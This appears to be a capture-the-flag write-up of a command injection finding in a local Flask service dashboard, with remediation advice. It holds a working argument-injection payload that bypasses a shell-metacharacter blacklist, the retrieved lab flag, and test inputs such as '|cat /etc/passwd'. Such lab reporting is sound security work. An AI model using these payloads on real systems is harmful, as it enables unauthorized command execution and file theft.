## TL;DR
- Objective: Exploit command injection vulnerability to execute commands and read FLAG.txt
- Outcome: ACHIEVED - Successfully retrieved flag via argument injection
- Highest-impact finding: Command injection via script argument injection bypassing blacklist filter
- Validation status: **FLAG RETRIEVED** - `FLAG{6d02caef8ff5891f2c5428e4cdd4c3075cc2caf568d5f4559b5192fd0e04f312}`

## Target Information
- Target: 127.0.0.1:32972
- Host / base URL: http://127.0.0.1:32972
- Application or component: Service Status Dashboard (Flask/Werkzeug)
- Authentication context: No authentication required
- Relevant technology details: Flask web application, backend utilizes check_service.sh shell script

## Confirmed Vulnerability
### Command Injection via Argument Injection
- Affected endpoint / component: POST /check_service
- Impact: Remote code execution - arbitrary command execution on server
- Preconditions: None (unauthenticated)
- Exact payload or PoC:

```json
{"service_name": "-t custom \"cat FLAG.txt\""}
```

## Steps to Reproduce
1. Send a POST request to `http://127.0.0.1:32972/check_service`
2. Include header `Content-Type: application/json`
3. Submit the following JSON body:
   ```json
   {"service_name": "-t custom \"cat FLAG.txt\""}
   ```
4. The backend check_service.sh script interprets `-t custom` as an option flag and `"cat FLAG.txt"` as the custom command argument
5. Observe the response containing FLAG.txt contents

## Validation / Evidence
- Validation token / flag: `FLAG{6d02caef8ff5891f2c5428e4cdd4c3075cc2caf568d5f4559b5192fd0e04f312}`
- Tool evidence: python_interpreter confirmed command injection with confidence 1.00
- Request evidence:
  ```
  POST http://127.0.0.1:32972/check_service
  Content-Type: application/json
  Body: {"service_name": "-t custom \"cat FLAG.txt\""}
  ```
- Response evidence:
  ```json
  {
    "service_name": "-t custom \"cat FLAG.txt\"",
    "status": "FLAG{6d02caef8ff5891f2c5428e4cdd4c3075cc2caf568d5f4559b5192fd0e04f312}true"
  }
  ```
- Notes on reliability / limitations: 
  - The blacklist blocks standard metacharacters: `;`, `|`, `&`, `` ` ``, `$`, `(`
  - Bypass achieved via quote escaping and script argument injection
  - Reliable exploitation - no rate limiting or WAF observed

## Remediation
- Root cause: The backend check_service.sh script accepts user-controlled input and passes it to shell execution. The script uses argument parsing (`-t custom`) that can be hijacked via crafted input containing escaped quotes.
- Recommended fix:
  1. **Primary**: Do not pass user input directly to shell commands. Use a whitelist of valid service names and map them to internal commands.
  2. **Secondary**: If dynamic execution is required, use Python's subprocess with argument lists instead of shell strings (e.g., `subprocess.run(['check_service.sh', service_name], shell=False)`).
  3. **Tertiary**: Remove the `-t custom` functionality or restrict it to authenticated admin users only.
- Defense-in-depth:
  - Implement strict input validation using whitelist approach (known good service names only)
  - Run the check_service script with minimal privileges (dedicated unprivileged service account)
  - Consider containerization/isolation for command execution
  - Implement logging and monitoring for suspicious service_name patterns

## How to Verify the Fix
1. Send the exploit payload: `{"service_name": "-t custom \"cat FLAG.txt\""}`
2. **Expected secure result**: 
   - HTTP 400 error or "Invalid service name" response
   - No file contents returned
   - No command execution occurs
3. Test valid service names still work (if applicable)
4. Attempt other injection payloads (`;id`, `|cat /etc/passwd`, etc.) - all should be rejected

## Remaining Leads
- Confirmed blockers: Blacklist blocks `;`, `|`, `&`, `` ` ``, `$`, `(` - these bypass attempts will fail
- Unverified leads: None - vulnerability fully confirmed and exploited
- Missing context: None
